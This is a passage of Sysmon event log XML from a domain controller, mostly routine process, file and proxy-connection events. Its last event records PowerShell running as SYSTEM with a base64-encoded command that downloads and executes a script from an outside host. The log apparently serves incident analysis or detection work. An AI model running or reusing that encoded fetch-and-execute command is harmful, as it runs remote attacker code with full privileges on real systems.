    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:35:43.0307163Z"/>
    <EventRecordID>3289992</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:35:43.030</Data>
    <Data Name="ProcessGuid">{83eb9c06-7a16-65f8-1400-00007b508c69}</Data>
    <Data Name="ProcessId">5752</Data>
    <Data Name="Image">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:36:21.5790568Z"/>
    <EventRecordID>3289993</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:36:21.579</Data>
    <Data Name="ProcessGuid">{83eb9c06-7b2a-65f8-e502-0010e96c348b}</Data>
    <Data Name="ProcessId">5800</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:36:46.0869982Z"/>
    <EventRecordID>3289995</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:36:46.086</Data>
    <Data Name="ProcessGuid">{83eb9c06-7bae-65f8-d102-0010f1480bf0}</Data>
    <Data Name="ProcessId">5668</Data>
    <Data Name="Image">C:\Windows\System32\dllhost.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">COM Surrogate</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">dllhost.exe</Data>
    <Data Name="CommandLine">dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=30A1BB5B6488DA366EC6CB150CFBC5E1D38AE4EC,MD5=0CF8A7A200AB4EC5554D66B94C14DBF1,SHA256=7330E24D8462CB4C728FAFB454B8F7B81D74B116E290264CC3727466370C3B00,IMPHASH=32EF2A6E05BBEAE7E85E49CA7C70F08E</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c6-65f0-1d02-0010ab917170}</Data>
    <Data Name="ParentProcessId">2340</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">svchost.exe -k DcomLaunch</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:36:51.7541714Z"/>
    <EventRecordID>3289996</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:36:51.754</Data>
    <Data Name="ProcessGuid">{83eb9c06-7bae-65f8-d102-0010f1480bf0}</Data>
    <Data Name="ProcessId">5668</Data>
    <Data Name="Image">C:\Windows\System32\dllhost.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:36:52.3246533Z"/>
    <EventRecordID>3289998</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:36:52.324</Data>
    <Data Name="ProcessGuid">{83eb9c06-43e3-65f0-6a00-0010cecb62bc}</Data>
    <Data Name="ProcessId">2492</Data>
    <Data Name="Image">C:\Windows\System32\csrss.exe</Data>
    <Data Name="TargetFilename">C:\Windows\Temp\58444.tmp</Data>
    <Data Name="CreationUtcTime">2024-03-18 17:36:52.324</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:37:44.5771034Z"/>
    <EventRecordID>3290000</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:37:44.577</Data>
    <Data Name="ProcessGuid">{83eb9c06-43c6-65f0-5700-0010a70e8279}</Data>
    <Data Name="ProcessId">2368</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="User">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.10.2.10</Data>
    <Data Name="SourceHostname">DC-01.meridianhcs.local</Data>
    <Data Name="SourcePort">65014</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">10.10.3.20</Data>
    <Data Name="DestinationHostname">PROXY-01.meridianhcs.local</Data>
    <Data Name="DestinationPort">8080</Data>
    <Data Name="DestinationPortName">http-alt</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>7</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>7</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:37:56.4788414Z"/>
    <EventRecordID>3290001</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:37:56.478</Data>
    <Data Name="ProcessGuid">{83eb9c06-7630-65f8-eb02-0000b795132b}</Data>
    <Data Name="ProcessId">5824</Data>
    <Data Name="Image">C:\Windows\System32\taskhostw.exe</Data>
    <Data Name="ImageLoaded">C:\Program Files\Windows Defender\MpOAV.dll</Data>
    <Data Name="FileVersion">4.18.2301.6</Data>
    <Data Name="Description">IOfficeAntiVirus Module</Data>
    <Data Name="Product">Microsoft Defender Antivirus</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">MpOAV.dll</Data>
    <Data Name="Hashes">SHA1=FC17FE09B96E6641A0C4DD89FE19E33173B862A9,MD5=DDBA590E19E88EA28373E3D47061E407,SHA256=11D3F5E67D04915646C72F60356E8ABB54A72F49B33A321C9E8622576EE491DD,IMPHASH=B50EDBF447D04C1BEFF75D2CC5E6EDF5</Data>
    <Data Name="Signed">true</Data>
    <Data Name="Signature">Microsoft Corporation</Data>
    <Data Name="SignatureStatus">Valid</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:38:24.2549683Z"/>
    <EventRecordID>3290004</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:38:24.254</Data>
    <Data Name="ProcessGuid">{83eb9c06-6b80-65f8-ef02-00005b7efe71}</Data>
    <Data Name="ProcessId">5612</Data>
    <Data Name="Image">C:\Program Files\Meridian\ServiceHealth\service-healthcheck.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.10.2.10</Data>
    <Data Name="SourceHostname">DC-01.meridianhcs.local</Data>
    <Data Name="SourcePort">55131</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">10.10.3.20</Data>
    <Data Name="DestinationHostname">PROXY-01.meridianhcs.local</Data>
    <Data Name="DestinationPort">8080</Data>
    <Data Name="DestinationPortName">http-alt</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:39:09.9889986Z"/>
    <EventRecordID>3290007</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:39:09.988</Data>
    <Data Name="ProcessGuid">{83eb9c06-43d5-65f0-f400-00003b51ab4f}</Data>
    <Data Name="ProcessId">2420</Data>
    <Data Name="Image">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe</Data>
    <Data Name="TargetFilename">C:\Windows\Temp\70929.tmp</Data>
    <Data Name="CreationUtcTime">2024-03-18 17:39:09.988</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:40:58.2484125Z"/>
    <EventRecordID>3290013</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:40:58.248</Data>
    <Data Name="ProcessGuid">{83eb9c06-43c6-65f0-5700-0010a70e8279}</Data>
    <Data Name="ProcessId">2368</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="User">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.10.2.10</Data>
    <Data Name="SourceHostname">DC-01.meridianhcs.local</Data>
    <Data Name="SourcePort">61062</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">10.10.3.20</Data>
    <Data Name="DestinationHostname">PROXY-01.meridianhcs.local</Data>
    <Data Name="DestinationPort">8080</Data>
    <Data Name="DestinationPortName">http-alt</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:41:30.6513034Z"/>
    <EventRecordID>3290014</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:41:30.651</Data>
    <Data Name="ProcessGuid">{83eb9c06-7cca-65f8-f300-001039d9c2e5}</Data>
    <Data Name="ProcessId">5672</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">Console Window Host</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">conhost.exe</Data>
    <Data Name="CommandLine">conhost.exe 0x4</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=A21F01CD47C2566A531DDDA6295C5F2729AEB2DD,MD5=D5DD0A35623D416B52F2DF3E64573716,SHA256=AD5D2369D2F142C551BF783A7F30D5BD9DE38C580046305DEDBBE7CD844E1905,IMPHASH=259D1C1188D5A01EADD9B3F236B1C61A</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c2-65f0-5902-0010c99eda93}</Data>
    <Data Name="ParentProcessId">2252</Data>
    <Data Name="ParentImage">C:\Windows\System32\csrss.exe</Data>
    <Data Name="ParentCommandLine">csrss.exe</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:41:31.1098917Z"/>
    <EventRecordID>3290015</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="1464"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:41:31.109</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43d8-65f0-2002-001079fbde0e}</Data>
    <Data Name="SourceProcessId">2428</Data>
    <Data Name="SourceThreadId">9028</Data>
    <Data Name="SourceImage">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c6-65f0-a500-0010a9f570f0}</Data>
    <Data Name="TargetProcessId">2352</Data>
    <Data Name="TargetImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="GrantedAccess">0x1000</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9D03E|C:\Windows\SYSTEM32\KERNELBASE.dll+2D551|C:\Windows\SYSTEM32\wbemcomn.dll+153EF</Data>
    <Data Name="SourceUser">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:41:32.4081678Z"/>
    <EventRecordID>3290016</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:41:32.408</Data>
    <Data Name="ProcessGuid">{83eb9c06-7cca-65f8-f300-001039d9c2e5}</Data>
    <Data Name="ProcessId">5672</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:42:07.3240238Z"/>
    <EventRecordID>3290017</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="1464"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:42:07.324</Data>
    <Data Name="ProcessGuid">{83eb9c06-7cef-65f8-0402-0010457a05fc}</Data>
    <Data Name="ProcessId">5936</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=01A8E9F9879B1D7F90EC74539B0A23151BE75B5C,MD5=DE1411AD7A2CC5682980A585125760CD,SHA256=ECAE4915FE2B09F9246E002F112F9CC4040D637130F6F720E950026755BF5924,IMPHASH=6A21FB1F45EF49F1CD6F6F3B8ABA78BA</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c6-65f0-5700-0010a70e8279}</Data>
    <Data Name="ParentProcessId">2368</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">svchost.exe -k netsvcs</Data>
    <Data Name="ParentUser">NT AUTHORITY\NETWORK SERVICE</Data>
    
  </EventData>
</Event>
